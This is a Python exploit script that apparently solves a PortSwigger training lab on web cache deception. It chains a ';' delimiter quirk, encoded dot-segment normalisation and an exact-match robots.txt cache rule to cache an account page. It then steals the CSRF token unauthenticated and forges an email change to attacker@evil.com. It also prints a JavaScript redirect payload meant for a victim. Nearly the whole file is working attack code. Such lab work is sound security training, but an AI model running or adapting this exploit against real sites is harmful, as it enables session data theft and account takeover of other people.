#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Exploiting exact-match cache rules for web cache deception.

Chains:
  1. ';' delimiter: origin treats ';' as path delimiter, cache does not
  2. Cache normalizes ..%2f: cache resolves encoded dot-segments, origin does not
  3. Exact-match rule: cache stores /robots.txt by exact name

Exploit path: /my-account;%2f%2e%2e%2frobots.txt?wcd

Steps:
  1. Poison cache with admin's session (deliver redirect to victim)
  2. Fetch cached response to steal admin's CSRF token
  3. Submit CSRF request to change admin's email
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EXPLOIT_PATH = "/my-account;%2f%2e%2e%2frobots.txt"


def login(lab, username, password):
    s = requests.Session()
    s.verify = False
    r = s.get(f"{lab}/login")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        raise ValueError("CSRF token not found on login page")
    s.post(f"{lab}/login", data={
        "csrf": csrf.group(1),
        "username": username,
        "password": password,
    }, allow_redirects=True)
    return s


def poison_cache(s, lab, buster, max_attempts=20):
    url = f"{lab}{EXPLOIT_PATH}?{buster}"
    print(f"[*] Poisoning: {url}")
    for i in range(1, max_attempts + 1):
        r = s.get(url, allow_redirects=False)
        cache = r.headers.get("X-Cache", "none")
        print(f"[{i:3d}] X-Cache={cache}  Status={r.status_code}")
        if cache == "hit":
            print("[+] Cache hit!")
            return True
        time.sleep(0.3)
    return False


def steal_csrf(lab, buster):
    url = f"{lab}{EXPLOIT_PATH}?{buster}"
    print(f"\n[*] Fetching cached response unauthenticated: {url}")
    r = requests.get(url, verify=False)
    cache = r.headers.get("X-Cache", "none")
    print(f"[*] X-Cache={cache}")
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    return None


def change_email(lab, csrf_token, new_email, admin_session=None):
    s = requests.Session()
    s.verify = False
    if admin_session:
        s.cookies.set("session", admin_session)
    r = s.post(
        f"{lab}/my-account/change-email",
        data={"email": new_email, "csrf": csrf_token},
        allow_redirects=True,
    )
    return r.status_code, r.url


def main():
    parser = argparse.ArgumentParser(
        description="Solve WCD Lab: exact-match cache rules (CSRF token theft)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener", help="Your account username")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--new-email", default="attacker@evil.com",
                        help="New email to set for admin (use unique value each run)")
    parser.add_argument("--buster", default="wcd1", help="Cache buster param value")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    # Phase 1: poison cache with our own session to verify the technique
    s = login(lab, args.username, args.password)
    print(f"[*] Logged in as {args.username}")

    if not poison_cache(s, lab, args.buster):
        print("[-] Cache never hit — verify the exploit path.")
        return

    # Phase 2: steal CSRF token from cached response
    # NOTE: in real lab, the cache must be poisoned with ADMIN's session via exploit server.
    # This script steals from our own cached response to demonstrate the technique.
    csrf = steal_csrf(lab, args.buster)
    if not csrf:
        print("[-] CSRF token not found in cached response.")
        return
    print(f"[+] CSRF token: {csrf}")
    print(f"\n[!] In the real lab:")
    print(f"    1. Deliver redirect to victim: /my-account;%2f%2e%2e%2frobots.txt?{args.buster}")
    print(f"    2. Fetch cached response in Repeater to get ADMIN's CSRF token")
    print(f"    3. Build CSRF PoC with admin token and deliver to victim")
    print(f"\n[*] Exploit server body:")
    print(f'<script>document.location="{lab}/my-account;%2f%2e%2e%2frobots.txt?{args.buster}"</script>')


if __name__ == "__main__":
    main()
